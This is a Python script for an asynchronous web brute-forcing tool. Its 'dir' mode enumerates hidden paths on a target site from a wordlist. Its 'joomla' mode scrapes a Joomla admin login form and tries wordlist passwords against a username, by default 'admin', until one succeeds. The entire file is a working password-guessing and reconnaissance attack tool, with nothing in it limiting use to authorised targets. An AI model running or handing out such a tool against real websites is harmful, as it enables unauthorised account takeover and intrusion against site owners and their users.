#!/usr/bin/env python3
import argparse
import asyncio
import json
import logging
import os
import sys
from dataclasses import dataclass
from typing import AsyncGenerator, Dict, List, Optional, Tuple

import aiohttp
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("web_bruter.log"),
        logging.StreamHandler()
    ]
)


@dataclass
class BruteForceConfig:
    target_url: str
    wordlist_path: str
    extensions: List[str]
    threads: int
    cookies: Dict[str, str]
    headers: Dict[str, str]
    form_data: Dict[str, str]
    success_indicators: List[str]
    rate_limit_delay: float


class WebBruter:
    def __init__(self, config: BruteForceConfig):
        self.config = config
        self.queue = asyncio.Queue()
        self.found_paths = []
        self.session = None
        self.stop_event = asyncio.Event()
        self.scanned_count = 0

    async def load_wordlist(self) -> None:
        """Load words from wordlist file into queue."""
        try:
            with open(self.config.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    word = line.strip()
                    if word:
                        await self.queue.put(word)
                        # Add variations with extensions
                        if "." not in word and self.config.extensions:
                            for ext in self.config.extensions:
                                await self.queue.put(f"{word}{ext}")
        except Exception as e:
            logging.error(f"Failed to load wordlist: {e}")
            raise

    async def init_session(self) -> None:
        """Initialize aiohttp session."""
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=self.config.threads)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookies=self.config.cookies,
            headers=self.config.headers
        )

    async def close_session(self) -> None:
        """Close aiohttp session."""
        if self.session:
            await self.session.close()

    async def check_path(self, path: str) -> Tuple[int, str]:
        """Check if path exists on target."""
        url = f"{self.config.target_url.rstrip('/')}/{path.lstrip('/')}"
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                self.scanned_count += 1
                if self.scanned_count % 100 == 0:
                    logging.info(f"Scanned {self.scanned_count} paths... Found {len(self.found_paths)}")

                content = await response.text()
                if any(indicator in content for indicator in self.config.success_indicators):
                    return response.status, url

                # Check for interesting responses
                if response.status in {200, 301, 302, 403}:
                    return response.status, url

                return 0, ""
        except Exception as e:
            logging.debug(f"Error checking {url}: {e}")
            return 0, ""

    async def worker(self) -> None:
        """Worker coroutine for brute forcing."""
        while not self.queue.empty() and not self.stop_event.is_set():
            path = await self.queue.get()
            status, url = await self.check_path(path)
            if status > 0:
                self.found_paths.append((status, url))
                logging.info(f"[{status}] Found: {url}")
            await asyncio.sleep(self.config.rate_limit_delay)

    async def run(self) -> None:
        """Main execution method."""
        try:
            await self.init_session()
            await self.load_wordlist()

            # Start worker tasks
            tasks = []
            for _ in range(self.config.threads):
                task = asyncio.create_task(self.worker())
                tasks.append(task)

            # Wait for completion or interrupt
            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                logging.info("Received interrupt, shutting down...")
                self.stop_event.set()
                await asyncio.gather(*tasks, return_exceptions=True)

            # Save results
            if self.found_paths:
                with open("found_paths.json", "w") as f:
                    json.dump(self.found_paths, f, indent=2)
                logging.info(f"Saved {len(self.found_paths)} found paths to found_paths.json")

        finally:
            await self.close_session()


class JoomlaBruter(WebBruter):
    async def detect_login_form(self) -> Dict[str, str]:
        """Detect Joomla login form fields."""
        try:
            async with self.session.get(self.config.target_url) as response:
                soup = BeautifulSoup(await response.text(), "html.parser")
                form = soup.find("form", {"name": "login"})
                if not form:
                    raise ValueError("Login form not found")

                hidden_fields = {
                    inp["name"]: inp.get("value", "")
                    for inp in form.find_all("input", type="hidden")
                }
                return hidden_fields
        except Exception as e:
            logging.error(f"Failed to detect login form: {e}")
            raise

    async def brute_force_login(self, username: str, password: str) -> bool:
        """Attempt Joomla login with given credentials."""
        try:
            form_data = self.config.form_data.copy()
            form_data.update({
                "username": username,
                "passwd": password,
                "task": "login",
                "option": "com_login"
            })

            async with self.session.post(
                    self.config.target_url,
                    data=form_data,
                    allow_redirects=True
            ) as response:
                content = await response.text()
                return any(
                    indicator in content
                    for indicator in self.config.success_indicators
                )
        except Exception as e:
            logging.debug(f"Login attempt failed for {username}:{password} - {e}")
            return False

    async def worker(self) -> None:
        """Worker coroutine for Joomla brute forcing."""
        while not self.queue.empty() and not self.stop_event.is_set():
            password = await self.queue.get()
            if await self.brute_force_login(self.config.form_data.get("username", "admin"), password):
                self.found_paths.append(password)
                logging.info(f"[!] Found valid password: {password}")
                self.stop_event.set()  # Stop on first success
            await asyncio.sleep(self.config.rate_limit_delay)


def load_config(config_file: str) -> BruteForceConfig:
    """Load configuration from JSON file."""
    with open(config_file) as f:
        config = json.load(f)
    return BruteForceConfig(**config)


async def main():
    parser = argparse.ArgumentParser(description="Advanced Web Brute Forcer")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Directory brute force
    dir_parser = subparsers.add_parser("dir", help="Directory brute force mode")
    dir_parser.add_argument("url", help="Target URL")
    dir_parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
    dir_parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    dir_parser.add_argument("-e", "--extensions", nargs="+", default=[".php", ".html"], help="File extensions to try")
    dir_parser.add_argument("-c", "--cookies", help="Cookies JSON file")
    dir_parser.add_argument("-H", "--headers", help="Headers JSON file")
    dir_parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between requests")

    # Joomla brute force
    joomla_parser = subparsers.add_parser("joomla", help="Joomla brute force mode")
    joomla_parser.add_argument("url", help="Joomla admin URL")
    joomla_parser.add_argument("-u", "--username", default="admin", help="Username to test")
    joomla_parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist file")
    joomla_parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    joomla_parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between attempts")
    joomla_parser.add_argument("-i", "--indicators", nargs="+", default=["Control Panel"], help="Success indicators")

    args = parser.parse_args()

    try:
        if args.command == "dir":
            config = BruteForceConfig(
                target_url=args.url,
                wordlist_path=args.wordlist,
                extensions=args.extensions,
                threads=args.threads,
                cookies=json.load(open(args.cookies)) if args.cookies else {},
                headers=json.load(open(args.headers)) if args.headers else {},
                form_data={},
                success_indicators=[],
                rate_limit_delay=args.delay
            )
            bruter = WebBruter(config)
        elif args.command == "joomla":
            config = BruteForceConfig(
                target_url=args.url,
                wordlist_path=args.wordlist,
                extensions=[],
                threads=args.threads,
                cookies={},
                headers={"User-Agent": "Mozilla/5.0"},
                form_data={"username": args.username},
                success_indicators=args.indicators,
                rate_limit_delay=args.delay
            )
            bruter = JoomlaBruter(config)
            await bruter.init_session()
            config.form_data.update(await bruter.detect_login_form())

        await bruter.run()

    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("\nBrute force interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    asyncio.run(main())
